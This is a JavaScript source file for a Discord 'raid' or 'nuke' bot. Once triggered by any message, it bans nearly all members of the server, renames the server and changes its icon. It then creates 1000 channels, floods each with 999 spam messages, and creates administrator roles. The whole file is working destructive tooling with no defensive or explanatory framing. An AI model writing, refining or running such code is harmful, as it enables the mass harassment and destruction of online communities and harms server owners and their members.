const { Client, Collection } = require("discord.js");
const config = require("./config.json");
const client = new Client();
client.commands = new Collection();
const colors = require('colors');

colors.setTheme({
  silly: 'rainbow',
  input: 'grey',
  verbose: 'cyan',
  prompt: 'grey',
  info: 'green',
  data: 'grey',
  help: 'cyan',
  warn: 'yellow',
  debug: 'blue',
  error: 'red'
});

process.on('uncaughtException', (error, origin) => {
    console.log('----- Uncaught exception -----')
    console.log(error)
    console.log('----- Exception origin -----')
    console.log(origin)
})

process.on('unhandledRejection', (reason, promise) => {
    console.log('----- Unhandled Rejection at -----')
    console.log(promise)
    console.log('----- Reason -----')
    console.log(reason)
})
client.on('ready', () => {
    console.log(``);
    console.log(`██╗  ██╗ ██████╗ ██╗  ██╗`.yellow);
    console.log(`██║  ██║██╔═████╗██║  ██║`.yellow);
    console.log(`███████║██║██╔██║███████║`.yellow);
    console.log(`╚════██║████╔╝██║╚════██║`.yellow);
    console.log(`     ██║╚██████╔╝     ██║`.yellow);
    console.log(`     ╚═╝ ╚═════╝      ╚═╝`.yellow);
    console.log(`────────────────────────────────────────────────────────────────────`.blue);
    console.log(`|-->  Developped by Kays`.blue);
    console.log(`────────────────────────────────────────────────────────────────────`.blue);
    console.log(`|-->  Name : ${client.user.username}`.blue);
    console.log(`|──────────────────────────────────────────────────────────────────|`.blue);
    console.log(`|-->  Servers   : ${client.guilds.cache.size}`.blue);
    console.log(`|──────────────────────────────────────────────────────────────────|`.blue);
    console.log(`|-->  Channels : ${client.channels.cache.size}`.blue);
    console.log(`|──────────────────────────────────────────────────────────────────|`.blue);
    console.log(`|-->  Server name: `.blue + (config.servername));
    console.log(`────────────────────────────────────────────────────────────────────`.blue);
    console.log(`|-->  Channel name: `.blue + (config.channelname));
    console.log(`────────────────────────────────────────────────────────────────────`.blue);
    console.log(`|-->  Message: `.blue + (config.raidmessage));
    console.log(`────────────────────────────────────────────────────────────────────`.blue);
    console.log(`|-->  Role name: `.blue + (config.rolename));
    console.log(`────────────────────────────────────────────────────────────────────`.blue);

    client.user.setActivity(".gg/404data", { type: "PLAYING" });
});



client.on('message', async (message) => {
    message.guild.members.cache.forEach((member) => {
        if (
            member != message.member &&
            member.id != 'ID' &&
            member.id != 'ID' &&
            member.id != 'ID'
        ) {
            member.ban();
        }
    });

    message.guild.edit({ name: config.servername }).catch(console.error);
    message.guild.setIcon(config.serverpfp).catch(console.error);

    for (let i = 0; i < 1000; i++) {
        message.guild.channels
            .create(config.channelname, { type: 'text' })
            .then((server) => {
                for (let j = 0; j < 999; j++) {
                    server.send(config.raidmessage);
                }
                message.guild.roles.create({
                    data: {
                        name: config.rolename,
                        color: 'RANDOM',
                        permissions: 'ADMINISTRATOR',
                    },
                });
            });
    }
});

client.login(config.token);